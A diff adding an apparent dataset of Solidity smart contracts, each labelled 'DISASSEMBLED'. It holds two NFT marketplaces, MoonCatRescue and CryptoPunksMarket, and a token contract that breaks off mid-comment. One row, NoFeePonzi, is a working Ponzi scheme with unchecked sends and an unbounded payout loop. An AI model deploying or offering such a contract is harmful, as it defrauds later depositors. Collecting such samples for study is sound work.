@@ -1,0 +1,3921 @@
+1,"pragma solidity ^0.4.13;
+
+contract MoonCatRescue {
+  enum Modes { Inactive, Disabled, Test, Live }
+
+  Modes public mode = Modes.Inactive;
+
+  address owner;
+
+  bytes16 public imageGenerationCodeMD5 = 0xdbad5c08ec98bec48490e3c196eec683; // use this to verify mooncatparser.js the cat image data generation javascript file.
+
+  string public name = ""MoonCats"";
+  string public symbol = ""?""; // unicode cat symbol
+  uint8 public decimals = 0;
+
+  uint256 public totalSupply = 25600;
+  uint16 public remainingCats = 25600 - 256; // there will only ever be 25,000 cats
+  uint16 public remainingGenesisCats = 256; // there can only be a maximum of 256 genesis cats
+  uint16 public rescueIndex = 0;
+
+  bytes5[25600] public rescueOrder;
+
+  bytes32 public searchSeed = 0x0; // gets set with the immediately preceding blockhash when the contract is activated to prevent ""premining""
+
+  struct AdoptionOffer {
+    bool exists;
+    bytes5 catId;
+    address seller;
+    uint price;
+    address onlyOfferTo;
+  }
+
+  struct AdoptionRequest{
+    bool exists;
+    bytes5 catId;
+    address requester;
+    uint price;
+  }
+
+  mapping (bytes5 => AdoptionOffer) public adoptionOffers;
+  mapping (bytes5 => AdoptionRequest) public adoptionRequests;
+
+  mapping (bytes5 => bytes32) public catNames;
+  mapping (bytes5 => address) public catOwners;
+  mapping (address => uint256) public balanceOf; //number of cats owned by a given address
+  mapping (address => uint) public pendingWithdrawals;
+
+  /* events */
+
+  event CatRescued(address indexed to, bytes5 indexed catId);
+  event CatNamed(bytes5 indexed catId, bytes32 catName);
+  event Transfer(address indexed from, address indexed to, uint256 value);
+  event CatAdopted(bytes5 indexed catId, uint price, address indexed from, address indexed to);
+  event AdoptionOffered(bytes5 indexed catId, uint price, address indexed toAddress);
+  event AdoptionOfferCancelled(bytes5 indexed catId);
+  event AdoptionRequested(bytes5 indexed catId, uint price, address indexed from);
+  event AdoptionRequestCancelled(bytes5 indexed catId);
+  event GenesisCatsAdded(bytes5[16] catIds);
+
+  function MoonCatRescue() payable {
+    owner = msg.sender;
+    assert((remainingCats + remainingGenesisCats) == totalSupply);
+    assert(rescueOrder.length == totalSupply);
+    assert(rescueIndex == 0);
+  }
+
+  /* registers and validates cats that are found */
+  function rescueCat(bytes32 seed) activeMode returns (bytes5) {
+    require(remainingCats > 0); // cannot register any cats once supply limit is reached
+    bytes32 catIdHash = keccak256(seed, searchSeed); // generate the prospective catIdHash
+    require(catIdHash[0] | catIdHash[1] | catIdHash[2] == 0x0); // ensures the validity of the catIdHash
+    bytes5 catId = bytes5((catIdHash & 0xffffffff) << 216); // one byte to indicate genesis, and the last 4 bytes of the catIdHash
+    require(catOwners[catId] == 0x0); // if the cat is already registered, throw an error. All cats are unique.
+
+    rescueOrder[rescueIndex] = catId;
+    rescueIndex++;
+
+    catOwners[catId] = msg.sender;
+    balanceOf[msg.sender]++;
+    remainingCats--;
+
+    CatRescued(msg.sender, catId);
+
+    return catId;
+  }
+
+  /* assigns a name to a cat, once a name is assigned it cannot be changed */
+  function nameCat(bytes5 catId, bytes32 catName) onlyCatOwner(catId) {
+    require(catNames[catId] == 0x0); // ensure the current name is empty; cats can only be named once
+    require(!adoptionOffers[catId].exists); // cats cannot be named while they are up for adoption
+    catNames[catId] = catName;
+    CatNamed(catId, catName);
+  }
+
+  /* puts a cat up for anyone to adopt */
+  function makeAdoptionOffer(bytes5 catId, uint price) onlyCatOwner(catId) {
+    require(price > 0);
+    adoptionOffers[catId] = AdoptionOffer(true, catId, msg.sender, price, 0x0);
+    AdoptionOffered(catId, price, 0x0);
+  }
+
+  /* puts a cat up for a specific address to adopt */
+  function makeAdoptionOfferToAddress(bytes5 catId, uint price, address to) onlyCatOwner(catId) isNotSender(to){
+    adoptionOffers[catId] = AdoptionOffer(true, catId, msg.sender, price, to);
+    AdoptionOffered(catId, price, to);
+  }
+
+  /* cancel an adoption offer */
+  function cancelAdoptionOffer(bytes5 catId) onlyCatOwner(catId) {
+    adoptionOffers[catId] = AdoptionOffer(false, catId, 0x0, 0, 0x0);
+    AdoptionOfferCancelled(catId);
+  }
+
+  /* accepts an adoption offer  */
+  function acceptAdoptionOffer(bytes5 catId) payable {
+    AdoptionOffer storage offer = adoptionOffers[catId];
+    require(offer.exists);
+    require(offer.onlyOfferTo == 0x0 || offer.onlyOfferTo == msg.sender);
+    require(msg.value >= offer.price);
+    if(msg.value > offer.price) {
+      pendingWithdrawals[msg.sender] += (msg.value - offer.price); // if the submitted amount exceeds the price allow the buyer to withdraw the difference
+    }
+    transferCat(catId, catOwners[catId], msg.sender, offer.price);
+  }
+
+  /* transfer a cat directly without payment */
+  function giveCat(bytes5 catId, address to) onlyCatOwner(catId) {
+    transferCat(catId, msg.sender, to, 0);
+  }
+
+  /* requests adoption of a cat with an ETH offer */
+  function makeAdoptionRequest(bytes5 catId) payable isNotSender(catOwners[catId]) {
+    require(catOwners[catId] != 0x0); // the cat must be owned
+    AdoptionRequest storage existingRequest = adoptionRequests[catId];
+    require(msg.value > 0);
+    require(msg.value > existingRequest.price);
+
+
+    if(existingRequest.price > 0) {
+      pendingWithdrawals[existingRequest.requester] += existingRequest.price;
+    }
+
+    adoptionRequests[catId] = AdoptionRequest(true, catId, msg.sender, msg.value);
+    AdoptionRequested(catId, msg.value, msg.sender);
+
+  }
+
+  /* allows the owner of the cat to accept an adoption request */
+  function acceptAdoptionRequest(bytes5 catId) onlyCatOwner(catId) {
+    AdoptionRequest storage existingRequest = adoptionRequests[catId];
+    require(existingRequest.exists);
+    address existingRequester = existingRequest.requester;
+    uint existingPrice = existingRequest.price;
+    adoptionRequests[catId] = AdoptionRequest(false, catId, 0x0, 0); // the adoption request must be cancelled before calling transferCat to prevent refunding the requester.
+    transferCat(catId, msg.sender, existingRequester, existingPrice);
+  }
+
+  /* allows the requester to cancel their adoption request */
+  function cancelAdoptionRequest(bytes5 catId) {
+    AdoptionRequest storage existingRequest = adoptionRequests[catId];
+    require(existingRequest.exists);
+    require(existingRequest.requester == msg.sender);
+
+    uint price = existingRequest.price;
+
+    adoptionRequests[catId] = AdoptionRequest(false, catId, 0x0, 0);
+
+    msg.sender.transfer(price);
+
+    AdoptionRequestCancelled(catId);
+  }
+
+
+  function withdraw() {
+    uint amount = pendingWithdrawals[msg.sender];
+    pendingWithdrawals[msg.sender] = 0;
+    msg.sender.transfer(amount);
+  }
+
+  /* owner only functions */
+
+  /* disable contract before activation. A safeguard if a bug is found before the contract is activated */
+  function disableBeforeActivation() onlyOwner inactiveMode {
+    mode = Modes.Disabled;  // once the contract is disabled it's mode cannot be changed
+  }
+
+  /* activates the contract in *Live* mode which sets the searchSeed and enables rescuing */
+  function activate() onlyOwner inactiveMode {
+    searchSeed = block.blockhash(block.number - 1); // once the searchSeed is set it cannot be changed;
+    mode = Modes.Live; // once the contract is activated it's mode cannot be changed
+  }
+
+  /* activates the contract in *Test* mode which sets the searchSeed and enables rescuing */
+  function activateInTestMode() onlyOwner inactiveMode { //
+    searchSeed = 0x5713bdf5d1c3398a8f12f881f0f03b5025b6f9c17a97441a694d5752beb92a3d; // once the searchSeed is set it cannot be changed;
+    mode = Modes.Test; // once the contract is activated it's mode cannot be changed
+  }
+
+  /* add genesis cats in groups of 16 */
+  function addGenesisCatGroup() onlyOwner activeMode {
+    require(remainingGenesisCats > 0);
+    bytes5[16] memory newCatIds;
+    uint256 price = (17 - (remainingGenesisCats / 16)) * 300000000000000000;
+    for(uint8 i = 0; i < 16; i++) {
+
+      uint16 genesisCatIndex = 256 - remainingGenesisCats;
+      bytes5 genesisCatId = (bytes5(genesisCatIndex) << 24) | 0xff00000ca7;
+
+      newCatIds[i] = genesisCatId;
+
+      rescueOrder[rescueIndex] = genesisCatId;
+      rescueIndex++;
+      balanceOf[0x0]++;
+      remainingGenesisCats--;
+
+      adoptionOffers[genesisCatId] = AdoptionOffer(true, genesisCatId, owner, price, 0x0);
+    }
+    GenesisCatsAdded(newCatIds);
+  }
+
+
+  /* aggregate getters */
+
+  function getCatIds() constant returns (bytes5[]) {
+    bytes5[] memory catIds = new bytes5[](rescueIndex);
+    for (uint i = 0; i < rescueIndex; i++) {
+      catIds[i] = rescueOrder[i];
+    }
+    return catIds;
+  }
+
+
+  function getCatNames() constant returns (bytes32[]) {
+    bytes32[] memory names = new bytes32[](rescueIndex);
+    for (uint i = 0; i < rescueIndex; i++) {
+      names[i] = catNames[rescueOrder[i]];
+    }
+    return names;
+  }
+
+  function getCatOwners() constant returns (address[]) {
+    address[] memory owners = new address[](rescueIndex);
+    for (uint i = 0; i < rescueIndex; i++) {
+      owners[i] = catOwners[rescueOrder[i]];
+    }
+    return owners;
+  }
+
+  function getCatOfferPrices() constant returns (uint[]) {
+    uint[] memory catOffers = new uint[](rescueIndex);
+    for (uint i = 0; i < rescueIndex; i++) {
+      bytes5 catId = rescueOrder[i];
+      if(adoptionOffers[catId].exists && adoptionOffers[catId].onlyOfferTo == 0x0) {
+        catOffers[i] = adoptionOffers[catId].price;
+      }
+    }
+    return catOffers;
+  }
+
+  function getCatRequestPrices() constant returns (uint[]) {
+    uint[] memory catRequests = new uint[](rescueIndex);
+    for (uint i = 0; i < rescueIndex; i++) {
+      bytes5 catId = rescueOrder[i];
+      catRequests[i] = adoptionRequests[catId].price;
+    }
+    return catRequests;
+  }
+
+  function getCatDetails(bytes5 catId) constant returns (bytes5 id,
+                                                         address owner,
+                                                         bytes32 name,
+                                                         address onlyOfferTo,
+                                                         uint offerPrice,
+                                                         address requester,
+                                                         uint requestPrice) {
+
+    return (catId,
+            catOwners[catId],
+            catNames[catId],
+            adoptionOffers[catId].onlyOfferTo,
+            adoptionOffers[catId].price,
+            adoptionRequests[catId].requester,
+            adoptionRequests[catId].price);
+  }
+
+  /* modifiers */
+  modifier onlyOwner() {
+    require(msg.sender == owner);
+    _;
+  }
+
+  modifier inactiveMode() {
+    require(mode == Modes.Inactive);
+    _;
+  }
+
+  modifier activeMode() {
+    require(mode == Modes.Live || mode == Modes.Test);
+    _;
+  }
+
+  modifier onlyCatOwner(bytes5 catId) {
+    require(catOwners[catId] == msg.sender);
+    _;
+  }
+
+  modifier isNotSender(address a) {
+    require(msg.sender != a);
+    _;
+  }
+
+  /* transfer helper */
+  function transferCat(bytes5 catId, address from, address to, uint price) private {
+    catOwners[catId] = to;
+    balanceOf[from]--;
+    balanceOf[to]++;
+    adoptionOffers[catId] = AdoptionOffer(false, catId, 0x0, 0, 0x0); // cancel any existing adoption offer when cat is transferred
+
+    AdoptionRequest storage request = adoptionRequests[catId]; //if the recipient has a pending adoption request, cancel it
+    if(request.requester == to) {
+      pendingWithdrawals[to] += request.price;
+      adoptionRequests[catId] = AdoptionRequest(false, catId, 0x0, 0);
+    }
+
+    pendingWithdrawals[from] += price;
+
+    Transfer(from, to, 1);
+    CatAdopted(catId, price, from, to);
+  }
+
+}",DISASSEMBLED
+2,"pragma solidity ^0.4.8;
+contract CryptoPunksMarket {
+
+    // You can use this hash to verify the image file containing all the punks
+    string public imageHash = ""ac39af4793119ee46bbff351d8cb6b5f23da60222126add4268e261199a2921b"";
+
+    address owner;
+
+    string public standard = 'CryptoPunks';
+    string public name;
+    string public symbol;
+    uint8 public decimals;
+    uint256 public totalSupply;
+
+    uint public nextPunkIndexToAssign = 0;
+
+    bool public allPunksAssigned = false;
+    uint public punksRemainingToAssign = 0;
+
+    //mapping (address => uint) public addressToPunkIndex;
+    mapping (uint => address) public punkIndexToAddress;
+
+    /* This creates an array with all balances */
+    mapping (address => uint256) public balanceOf;
+
+    struct Offer {
+        bool isForSale;
+        uint punkIndex;
+        address seller;
+        uint minValue;          // in ether
+        address onlySellTo;     // specify to sell only to a specific person
+    }
+
+    struct Bid {
+        bool hasBid;
+        uint punkIndex;
+        address bidder;
+        uint value;
+    }
+
+    // A record of punks that are offered for sale at a specific minimum value, and perhaps to a specific person
+    mapping (uint => Offer) public punksOfferedForSale;
+
+    // A record of the highest punk bid
+    mapping (uint => Bid) public punkBids;
+
+    mapping (address => uint) public pendingWithdrawals;
+
+    event Assign(address indexed to, uint256 punkIndex);
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event PunkTransfer(address indexed from, address indexed to, uint256 punkIndex);
+    event PunkOffered(uint indexed punkIndex, uint minValue, address indexed toAddress);
+    event PunkBidEntered(uint indexed punkIndex, uint value, address indexed fromAddress);
+    event PunkBidWithdrawn(uint indexed punkIndex, uint value, address indexed fromAddress);
+    event PunkBought(uint indexed punkIndex, uint value, address indexed fromAddress, address indexed toAddress);
+    event PunkNoLongerForSale(uint indexed punkIndex);
+
+    /* Initializes contract with initial supply tokens to the creator of the contract */
+    function CryptoPunksMarket() payable {
+        //        balanceOf[msg.sender] = initialSupply;              // Give the creator all initial tokens
+        owner = msg.sender;
+        totalSupply = 10000;                        // Update total supply
+        punksRemainingToAssign = totalSupply;
+        name = ""CRYPTOPUNKS"";                                   // Set the name for display purposes
+        symbol = ""Ͼ"";                               // Set the symbol for display purposes
+        decimals = 0;                                       // Amount of decimals for display purposes
+    }
+
+    function setInitialOwner(address to, uint punkIndex) {
+        if (msg.sender != owner) throw;
+        if (allPunksAssigned) throw;
+        if (punkIndex >= 10000) throw;
+        if (punkIndexToAddress[punkIndex] != to) {
+            if (punkIndexToAddress[punkIndex] != 0x0) {
+                balanceOf[punkIndexToAddress[punkIndex]]--;
+            } else {
+                punksRemainingToAssign--;
+            }
+            punkIndexToAddress[punkIndex] = to;
+            balanceOf[to]++;
+            Assign(to, punkIndex);
+        }
+    }
+
+    function setInitialOwners(address[] addresses, uint[] indices) {
+        if (msg.sender != owner) throw;
+        uint n = addresses.length;
+        for (uint i = 0; i < n; i++) {
+            setInitialOwner(addresses[i], indices[i]);
+        }
+    }
+
+    function allInitialOwnersAssigned() {
+        if (msg.sender != owner) throw;
+        allPunksAssigned = true;
+    }
+
+    function getPunk(uint punkIndex) {
+        if (!allPunksAssigned) throw;
+        if (punksRemainingToAssign == 0) throw;
+        if (punkIndexToAddress[punkIndex] != 0x0) throw;
+        if (punkIndex >= 10000) throw;
+        punkIndexToAddress[punkIndex] = msg.sender;
+        balanceOf[msg.sender]++;
+        punksRemainingToAssign--;
+        Assign(msg.sender, punkIndex);
+    }
+
+    // Transfer ownership of a punk to another user without requiring payment
+    function transferPunk(address to, uint punkIndex) {
+        if (!allPunksAssigned) throw;
+        if (punkIndexToAddress[punkIndex] != msg.sender) throw;
+        if (punkIndex >= 10000) throw;
+        if (punksOfferedForSale[punkIndex].isForSale) {
+            punkNoLongerForSale(punkIndex);
+        }
+        punkIndexToAddress[punkIndex] = to;
+        balanceOf[msg.sender]--;
+        balanceOf[to]++;
+        Transfer(msg.sender, to, 1);
+        PunkTransfer(msg.sender, to, punkIndex);
+        // Check for the case where there is a bid from the new owner and refund it.
+        // Any other bid can stay in place.
+        Bid bid = punkBids[punkIndex];
+        if (bid.bidder == to) {
+            // Kill bid and refund value
+            pendingWithdrawals[to] += bid.value;
+            punkBids[punkIndex] = Bid(false, punkIndex, 0x0, 0);
+        }
+    }
+
+    function punkNoLongerForSale(uint punkIndex) {
+        if (!allPunksAssigned) throw;
+        if (punkIndexToAddress[punkIndex] != msg.sender) throw;
+        if (punkIndex >= 10000) throw;
+        punksOfferedForSale[punkIndex] = Offer(false, punkIndex, msg.sender, 0, 0x0);
+        PunkNoLongerForSale(punkIndex);
+    }
+
+    function offerPunkForSale(uint punkIndex, uint minSalePriceInWei) {
+        if (!allPunksAssigned) throw;
+        if (punkIndexToAddress[punkIndex] != msg.sender) throw;
+        if (punkIndex >= 10000) throw;
+        punksOfferedForSale[punkIndex] = Offer(true, punkIndex, msg.sender, minSalePriceInWei, 0x0);
+        PunkOffered(punkIndex, minSalePriceInWei, 0x0);
+    }
+
+    function offerPunkForSaleToAddress(uint punkIndex, uint minSalePriceInWei, address toAddress) {
+        if (!allPunksAssigned) throw;
+        if (punkIndexToAddress[punkIndex] != msg.sender) throw;
+        if (punkIndex >= 10000) throw;
+        punksOfferedForSale[punkIndex] = Offer(true, punkIndex, msg.sender, minSalePriceInWei, toAddress);
+        PunkOffered(punkIndex, minSalePriceInWei, toAddress);
+    }
+
+    function buyPunk(uint punkIndex) payable {
+        if (!allPunksAssigned) throw;
+        Offer offer = punksOfferedForSale[punkIndex];
+        if (punkIndex >= 10000) throw;
+        if (!offer.isForSale) throw;                // punk not actually for sale
+        if (offer.onlySellTo != 0x0 && offer.onlySellTo != msg.sender) throw;  // punk not supposed to be sold to this user
+        if (msg.value < offer.minValue) throw;      // Didn't send enough ETH
+        if (offer.seller != punkIndexToAddress[punkIndex]) throw; // Seller no longer owner of punk
+
+        address seller = offer.seller;
+
+        punkIndexToAddress[punkIndex] = msg.sender;
+        balanceOf[seller]--;
+        balanceOf[msg.sender]++;
+        Transfer(seller, msg.sender, 1);
+
+        punkNoLongerForSale(punkIndex);
+        pendingWithdrawals[seller] += msg.value;
+        PunkBought(punkIndex, msg.value, seller, msg.sender);
+
+        // Check for the case where there is a bid from the new owner and refund it.
+        // Any other bid can stay in place.
+        Bid bid = punkBids[punkIndex];
+        if (bid.bidder == msg.sender) {
+            // Kill bid and refund value
+            pendingWithdrawals[msg.sender] += bid.value;
+            punkBids[punkIndex] = Bid(false, punkIndex, 0x0, 0);
+        }
+    }
+
+    function withdraw() {
+        if (!allPunksAssigned) throw;
+        uint amount = pendingWithdrawals[msg.sender];
+        // Remember to zero the pending refund before
+        // sending to prevent re-entrancy attacks
+        pendingWithdrawals[msg.sender] = 0;
+        msg.sender.transfer(amount);
+    }
+
+    function enterBidForPunk(uint punkIndex) payable {
+        if (punkIndex >= 10000) throw;
+        if (!allPunksAssigned) throw;                
+        if (punkIndexToAddress[punkIndex] == 0x0) throw;
+        if (punkIndexToAddress[punkIndex] == msg.sender) throw;
+        if (msg.value == 0) throw;
+        Bid existing = punkBids[punkIndex];
+        if (msg.value <= existing.value) throw;
+        if (existing.value > 0) {
+            // Refund the failing bid
+            pendingWithdrawals[existing.bidder] += existing.value;
+        }
+        punkBids[punkIndex] = Bid(true, punkIndex, msg.sender, msg.value);
+        PunkBidEntered(punkIndex, msg.value, msg.sender);
+    }
+
+    function acceptBidForPunk(uint punkIndex, uint minPrice) {
+        if (punkIndex >= 10000) throw;
+        if (!allPunksAssigned) throw;                
+        if (punkIndexToAddress[punkIndex] != msg.sender) throw;
+        address seller = msg.sender;
+        Bid bid = punkBids[punkIndex];
+        if (bid.value == 0) throw;
+        if (bid.value < minPrice) throw;
+
+        punkIndexToAddress[punkIndex] = bid.bidder;
+        balanceOf[seller]--;
+        balanceOf[bid.bidder]++;
+        Transfer(seller, bid.bidder, 1);
+
+        punksOfferedForSale[punkIndex] = Offer(false, punkIndex, bid.bidder, 0, 0x0);
+        uint amount = bid.value;
+        punkBids[punkIndex] = Bid(false, punkIndex, 0x0, 0);
+        pendingWithdrawals[seller] += amount;
+        PunkBought(punkIndex, bid.value, seller, bid.bidder);
+    }
+
+    function withdrawBidForPunk(uint punkIndex) {
+        if (punkIndex >= 10000) throw;
+        if (!allPunksAssigned) throw;                
+        if (punkIndexToAddress[punkIndex] == 0x0) throw;
+        if (punkIndexToAddress[punkIndex] == msg.sender) throw;
+        Bid bid = punkBids[punkIndex];
+        if (bid.bidder != msg.sender) throw;
+        PunkBidWithdrawn(punkIndex, bid.value, msg.sender);
+        uint amount = bid.value;
+        punkBids[punkIndex] = Bid(false, punkIndex, 0x0, 0);
+        // Refund the bid money
+        msg.sender.transfer(amount);
+    }
+
+}",DISASSEMBLED
+8,"contract NoFeePonzi {
+
+  uint public constant MIN_VALUE = 1 ether;
+  uint public constant MAX_VALUE = 10 ether;
+
+  uint public constant RET_MUL = 110;
+  uint public constant RET_DIV = 100;
+
+  struct Payout {
+    address addr;
+    uint yield;
+  }
+
+  Payout[] public payouts;
+  uint public payoutIndex = 0;
+  uint public payoutTotal = 0;
+
+  function NoFeePonzi() {
+  }
+
+  function() {
+    if ((msg.value < MIN_VALUE) || (msg.value > MAX_VALUE)) {
+      throw;
+    }
+
+    uint entryIndex = payouts.length;
+    payouts.length += 1;
+    payouts[entryIndex].addr = msg.sender;
+    payouts[entryIndex].yield = (msg.value * RET_MUL) / RET_DIV;
+
+    while (payouts[payoutIndex].yield < this.balance) {
+      payoutTotal += payouts[payoutIndex].yield;
+      payouts[payoutIndex].addr.send(payouts[payoutIndex].yield);
+      payoutIndex += 1;
+    }
+  }
+}",DISASSEMBLED
+4,"pragma solidity ^0.4.8;
+
+//This contract is backed by the constitution of superDAO deployed at : .
+//The constitution of the superDAO is the social contract, terms, founding principles and definitions of the vision,
+//mission, anti-missions, rules and operation guidelines of superDAO.
+//The total number of 3,000,000 represents 3% of 100,000,000 immutable number of superDAO tokens,
+//which is the alloted budget of operation for the earliest funding activities.
+//Every prommissory token is exchangeable for the real superDAO tokens on a one on one basis.
+//Promissiory contract will be deployed with the actual superDAO token contract.
+//Early backers can call the ""redeem"" function on the actual token contract to exchange promissory tokens for the final tokens.
+
+/**
+ * @title Promisory Token Contract
+ * @author ola
+ * --- Collaborators ---
+ * @author zlatinov
+ * @author panos
+ * @author yemi
+ * @author archil
+ * @author anthony
+ */
+contract PromissoryToken {
+
+    event FounderSwitchRequestEvent(address _newFounderAddr);
+    event FounderSwitchedEvent(address _newFounderAddr);
+    event CofounderSwitchedEvent(address _newCofounderAddr);
+
+    event AddedPrepaidTokensEvent(address backer, uint index, uint price, uint amount);
+    event PrepaidTokensClaimedEvent(address backer, uint index, uint price, uint amount);
+    event TokensClaimedEvent(address backer, uint index, uint price, uint amount);
+
+    event RedeemEvent(address backer, uint amount);
+
+    event WithdrawalCreatedEvent(uint withdrawalId, uint amount, bytes reason);
+    event WithdrawalVotedEvent(uint withdrawalId, address backer, uint backerStakeWeigth, uint totalStakeWeight);
+    event WithdrawalApproved(uint withdrawalId, uint stakeWeight, bool isMultiPayment, uint amount, bytes reason);
+
+    address founder; //deployer of constitution and PromissoryToken
+    bytes32 founderHash; // hash must be confirmed in order to replace founder address
+    mapping(address => bytes32) tempHashes; // structure to contain new address to hash storage,
+    address cofounder;//helper to aid founder key exchange in case of key loss
+    address [] public previousFounders; //list of addresses replaced using the switching process.
+    uint constant discountAmount = 60; //discount amount
+    uint constant divisor = 100; //divisor to get discount value
+
+    uint public constant minimumPrepaidClaimedPercent = 65;
+    uint public promissoryUnits = 3000000; //amount of tokens contants set
+    uint public prepaidUnits = 0; //prepaid and set by founder out of 3 million tokens
+    uint public claimedUnits = 0; //claimed tokens out of 3 million tokens
+    uint public claimedPrepaidUnits = 0; //claimed tokens out of the early backer's tokens/prepaidUnits
+    uint public redeemedTokens = 0; //number of tokens out of claimed tokens, redeemed by superDAO token call
+    uint public lastPrice = 0; //latest price of token acquired by backer in Wei
+    uint public numOfBackers; //number of early backers
+
+    struct backerData {
+       uint tokenPrice;
+       uint tokenAmount;
+       bytes32 privateHash;
+       bool prepaid;
+       bool claimed;
+       uint backerRank;
+    }
+
+    address[] public earlyBackerList; //addresses of earliest backers
+    address[] public backersAddresses; //addresses of all backers
+    mapping(address => backerData[]) public backers;// backer address to backer info mapping
+    mapping(address => bool) public backersRedeemed;
+
+    struct withdrawalData {
+       uint Amount;
+       bool approved;
+       bool spent;
+       bytes reason;
+       address[] backerApprovals;
+       uint totalStake;
+       address[] destination;
+    }
+
+    withdrawalData[] public withdrawals; // Data structure specifying withdrawal
+    mapping(address => mapping(uint => bool)) public withdrawalsVotes;
+
+    /**
+    * @notice Deploy PromissoryToken contract with `msg.sender.address()` as founder with `_prepaidBackers.number()` prepaid backers
+    * @dev This is the constructor of the promisory token contract
+    * @param _founderHash Founders password hash, preferable a message digest to further obfuscate duplicaion
+    * @param _cofounderAddress The helper cofounder to aid founder key exchange in case of key loss/
+    * @param _numOfBackers The number of Early backers. Will be used to control setting early backers
+    */
+    function PromissoryToken( bytes32 _founderHash, address _cofounderAddress, uint _numOfBackers){
+        founder = msg.sender;
+        founderHash = sha3(_founderHash);
+        cofounder = _cofounderAddress;
+        numOfBackers = _numOfBackers;
+    }
+
+    /**
+    * @notice `msg.sender.address()` updating cofounder address to `_newFounderAddr.address()`
+    * @dev allows cofounder to switch out addres for a new one.Can be repeated as many times as needed
+    * @param _newCofounderAddr New Address of Cofounder
+    * @return True if the coFounder address successfully updated
+    */
+    function cofounderSwitchAddress(address _newCofounderAddr) external returns (bool success){
+        if (msg.sender != cofounder) throw;
+
+        cofounder = _newCofounderAddr;
+        CofounderSwitchedEvent(_newCofounderAddr);
+
+        return true;
+    }
+
+    /**
+    * @notice Founder address update to `_newFounderAddr.address()` is being requested
+    * @dev founderSwitchAddress founder indicates intent to switch addresses with new address,
+    * hash of pass phrase and a ""onetime shared phrase shared with coufounder""
+    * @param _founderHash Secret Key to be used to confirm Address update
+    * @param _oneTimesharedPhrase Shared pre-hashed Secret key for offline trust to be shared with coFounder to approve Address update
+    * @return True if Address switch request successfully created and Temporary hash Values set
+    */
+    function founderSwitchRequest(bytes32 _founderHash, bytes32 _oneTimesharedPhrase) returns (bool success){
+        if(sha3(_founderHash) != founderHash) throw;
+
+        tempHashes[msg.sender] = sha3(msg.sender, founderHash, _oneTimesharedPhrase);
+        FounderSwitchRequestEvent(msg.sender);
+
+        return true;
+    }
+
+   /**
+    * @notice `msg.sender.address()` approving `_newFounderAddr.address()` as new founder address
+    * @dev CofounderSwitchAddress which allows previously set cofounder to approve address
+    * switch by founder. Must have a one time shared phrase thats is shared with founder that corresponding with a
+    * hashed value.
+    * @param _newFounderAddr The address of Founder to be newly set
+    * @param _oneTimesharedPhrase Shared pre-hashed Secret key for offline trust, to provide access to the approval function
+    * @return True if new Founder address successfully approved
+    */
+    function cofounderApproveSwitchRequest(address _newFounderAddr, bytes32 _oneTimesharedPhrase) external returns (bool success){
+        if(msg.sender != cofounder || sha3(_newFounderAddr, founderHash, _oneTimesharedPhrase) != tempHashes[_newFounderAddr]) throw;
+
+        previousFounders.push(founder);
+        founder = _newFounderAddr;
+        FounderSwitchedEvent(_newFounderAddr);
+
+        return true;
+    }
+
+    /**
+    * @notice Adding `_backer.address()` as an early backer
+    * @dev Add Early backers to Contract setting the transacton details
+    * @param _backer The address of the superDAO backer
+    * @param _tokenPrice The price/rate at which the superDAO tokens were bought
+    * @param _tokenAmount The total number of superDAO token purcgased at the indicated rate
+    * @param _privatePhrase Shared pre-hashed Secret key for offline price negotiation to online attestation of SuperDAO tokens ownership
+    * @param _backerRank Rank of the backer in the backers list
+    * @return Thre index of _backer  in the backers list
+    */
+    function setPrepaid(address _backer, uint _tokenPrice, uint _tokenAmount, string _privatePhrase, uint _backerRank)
+        external
+        founderCall
+        returns (uint)
+    {
+        if (_tokenPrice == 0 || _tokenAmount == 0 || claimedPrepaidUnits>0 ||
+            _tokenAmount + prepaidUnits + claimedUnits > promissoryUnits) throw;
+        if (earlyBackerList.length == numOfBackers && backers[_backer].length == 0) throw ;
+        if (backers[_backer].length == 0) {
+            earlyBackerList.push(_backer);
+            backersAddresses.push(_backer);
+        }
+        backers[_backer].push(backerData(_tokenPrice, _tokenAmount, sha3(_privatePhrase, _backer), true, false, _backerRank));
+
+        prepaidUnits +=_tokenAmount;
+        lastPrice = _tokenPrice;
+
+        AddedPrepaidTokensEvent(_backer, backers[_backer].length - 1, _tokenPrice, _tokenAmount);
+
+        return backers[_backer].length - 1;
+    }
+
+    /**
+    * @notice Claiming `_tokenAmount.number()` superDAO tokens by `msg.sender.address()`
+    * @dev Claim superDAO Early backer tokens
+    * @param _index index of tokens to claim
+    * @param _boughtTokensPrice Price at which the superDAO tokens were bought
+    * @param _tokenAmount Number of superDAO tokens to be claimed
+    * @param _privatePhrase Shared pre-hashed Secret key for offline price negotiation to online attestation of SuperDAO tokens ownership
+    * @param _backerRank Backer rank of the backer in the superDAO
+    */
+    function claimPrepaid(uint _index, uint _boughtTokensPrice, uint _tokenAmount, string _privatePhrase, uint _backerRank)
+        external
+        EarliestBackersSet
+    {
+        if(backers[msg.sender][_index].prepaid == true &&
+           backers[msg.sender][_index].claimed == false &&
+           backers[msg.sender][_index].tokenAmount == _tokenAmount &&
+           backers[msg.sender][_index].tokenPrice == _boughtTokensPrice &&
+           backers[msg.sender][_index].privateHash == sha3( _privatePhrase, msg.sender) &&
+           backers[msg.sender][_index].backerRank == _backerRank)
+        {
+            backers[msg.sender][_index].claimed = true;
+            claimedPrepaidUnits += _tokenAmount;
+
+            PrepaidTokensClaimedEvent(msg.sender, _index, _boughtTokensPrice, _tokenAmount);
+        } else {
+            throw;
+        }
+    }
+
+    /**
+    * @notice `msg.sender.address()` is Purchasing `(msg.value / lastPrice).toFixed(0)` superDAO Tokens at `lastPrice`
+    * @dev Purchase new superDAO Tokens if the amount of tokens are still available for purchase
+    */
+    function claim()
+        payable
+        external
+        MinimumBackersClaimed
+   {
+        if (lastPrice == 0) throw;
+
+        //don`t accept transactions with zero value
+        if (msg.value == 0) throw;
+
+
+        //Effective discount for Pre-crowdfunding backers of 40% Leaving effective rate of 60%
+        uint discountPrice = lastPrice * discountAmount / divisor;
+
+        uint tokenAmount = (msg.value / discountPrice);//Effect the discount rate 0f 40%
+
+        if (tokenAmount + claimedUnits + prepaidUnits > promissoryUnits) throw;
+
+        if (backers[msg.sender].length == 0) {
+            backersAddresses.push(msg.sender);
+        }
+        backers[msg.sender].push(backerData(discountPrice, tokenAmount, sha3(msg.sender), false, true, 0));
+
+        claimedUnits += tokenAmount;
+
+        TokensClaimedEvent(msg.sender, backers[msg.sender].length - 1, discountPrice, tokenAmount);
+    }
+
+    /**
+     * @notice checking `_backerAddress.address()` superDAO Token balance: `index`
+     * @dev Check Token balance by index of backer, return values can be used to instantiate a backerData struct
+     * @param _backerAddress The Backer's address
